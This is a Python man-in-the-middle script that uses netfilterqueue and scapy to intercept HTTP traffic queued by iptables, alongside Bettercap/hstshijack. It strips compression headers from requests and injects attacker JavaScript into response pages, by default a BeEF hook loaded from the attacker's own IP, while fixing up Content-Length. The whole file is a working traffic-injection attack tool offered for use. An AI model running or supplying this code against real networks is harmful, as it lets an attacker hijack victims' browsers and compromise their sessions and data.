#!/usr/bin/env python

import netfilterqueue
import scapy.all as sc
import subprocess
import argparse
import re


def get_ip():
    pipecmd_ip = "/sbin/ip route | awk '/src/ { printf $9 }'"
    ip = subprocess.check_output(pipecmd_ip,shell=True)
    ip_decoded = ip.decode('utf-8')
    return ip_decoded


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-s','--script',dest = 'injection_script',help = 'Enter Java malicious JavaScript code that will be injected into webpage. Leave blank to inject BeEF hook:<script src=\"http://{}:3000/hook.js\"></script>'.format(my_ip))
    parser.set_defaults(injection_script = '<script src="http://{}:3000/hook.js"></script>'.format(my_ip))
    options = parser.parse_args()
    return options


def iptable_conf():
    pipecmd_lm = 'iptables -I OUTPUT -j NFQUEUE --queue-num 1001 && iptables -I INPUT -j NFQUEUE --queue-num 1001' 
    return subprocess.check_output(pipecmd_lm,shell=True)


def set_load(rpkt,load):
    rpkt[sc.Raw].load = load
    del rpkt[sc.IP].len    
    del rpkt[sc.IP].chksum
    del rpkt[sc.TCP].chksum
    return rpkt


def process_packet(pkt):
    sc_pkt = sc.IP(pkt.get_payload())
    if sc_pkt.haslayer(sc.TCP):
        if sc_pkt.haslayer(sc.Raw):
            #load = sc_pkt[sc.Raw].load
            if sc_pkt[sc.TCP].dport == 8080:
                #print('[+] Request caught by Bettercap\n\n')
                sc_req_pkt = sc_pkt
                req_load = sc_req_pkt[sc.Raw].load
                req_load = req_load.decode('utf-8','ignore')
                req_load = re.sub("Accept-Encoding:.*?\\r\\n",'',req_load)
                req_load = req_load.replace("HTTP/1.1","HTTP/1.0")
                #print(req_load)   
                sc_req_pkt = set_load(sc_req_pkt,req_load)
                #print(sc_req_pkt.show())
                pkt.set_payload(bytes(sc_req_pkt))    

            
            
            elif sc_pkt[sc.TCP].sport == 8080:
                sc_resp_pkt = sc_pkt
                injection_script = opt.injection_script 
                #print('[+] Response from Bettercap')
                resp_load = sc_resp_pkt[sc.Raw].load.decode('utf-8','ignore')
                resp_load = resp_load.replace("</body>",injection_script+"</body>") #requires there to be html in the page, if page doesn't have html, injection will not work (js only)
                content_length_search = re.search(r'(?:Content-Length:\s)(\d*)', resp_load)
                if content_length_search:
                    print('Found content length. Replacing...') # doesn't allow injection to work in js website only (example was http:bing.com but hsts prohibits), should still inject js script
                    content_length = content_length_search.group(1) #returning second group which is the actual content length number
                    new_content_length = int(content_length) + len(injection_script) #adding length of chars in injection string 
                    resp_load = resp_load.replace(content_length,str(new_content_length))
                    resp_load = resp_load.replace('HTTP/1.1','HTTP/1.0')
                    print('Modified load:\n',resp_load)
                    print('original content length:',content_length,'\nmodified content length:',new_content_length)

                      
                sc_resp_pkt = set_load(sc_resp_pkt,resp_load)
                print(sc_resp_pkt.show())
                pkt.set_payload(bytes(sc_resp_pkt))
    
    
    pkt.accept()


try:
    my_ip = get_ip()
    opt = get_args()
    iptable_conf()
    print("iptables configured\nEnsure Bettercap/hstshijack is running")
    print("Injection script = \n{}".format(opt.injection_script))
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(1001, process_packet)
    queue.run()
    
    
except KeyboardInterrupt:
    subprocess.check_output('iptables -F',shell=True)
    print('\nIPtables flushed\nApache stopped')
